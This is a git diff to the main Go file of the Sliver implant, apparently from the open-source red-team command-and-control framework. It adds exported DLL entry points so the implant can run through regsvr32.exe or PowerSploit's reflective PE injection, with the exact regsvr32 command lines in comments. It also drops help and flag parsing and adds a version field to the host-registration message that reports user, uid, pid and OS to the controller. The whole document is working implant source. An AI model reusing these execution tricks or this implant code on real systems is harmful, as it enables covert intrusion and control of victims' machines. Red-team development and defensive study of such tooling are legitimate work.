@@ -19,13 +19,11 @@ package main
 */
 
 // {{if .IsSharedLib}}
-
 import "C"
 
 // {{end}}
 
 import (
-	"flag"
 	"os"
 	"os/user"
 	"runtime"
@@ -42,6 +40,7 @@ import (
 	"github.com/bishopfox/sliver/sliver/handlers"
 	"github.com/bishopfox/sliver/sliver/limits"
 	"github.com/bishopfox/sliver/sliver/transports"
+	"github.com/bishopfox/sliver/sliver/version"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -54,6 +53,29 @@ func RunSliver() {
 	main()
 }
 
+// Thanks Ne0nd0g for those
+//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65
+
+// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
+//export VoidFunc
+func VoidFunc() { main() }
+
+// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
+//export DllInstall
+func DllInstall() { main() }
+
+// DLLRegisterServer is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
+//export DllRegisterServer
+func DllRegisterServer() { main() }
+
+// DLLUnregisterServer is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
+//export DllUnregisterServer
+func DllUnregisterServer() { main() }
+
+
 // {{end}}
 
 func main() {
@@ -64,9 +86,6 @@ func main() {
 	log.SetFlags(0)
 	log.SetOutput(ioutil.Discard)
 	// {{end}}
-
-	flag.Usage = func() {} // No help!
-	flag.Parse()
 
 	// {{if .Debug}}
 	log.Printf("Hello my name is %s", consts.SliverName)
@@ -161,6 +180,7 @@ func getRegisterSliver() *pb.Envelope {
 		Uid:      currentUser.Uid,
 		Gid:      currentUser.Gid,
 		Os:       runtime.GOOS,
+		Version:  version.GetVersion(),
 		Arch:     runtime.GOARCH,
 		Pid:      int32(os.Getpid()),
 		Filename: filename,
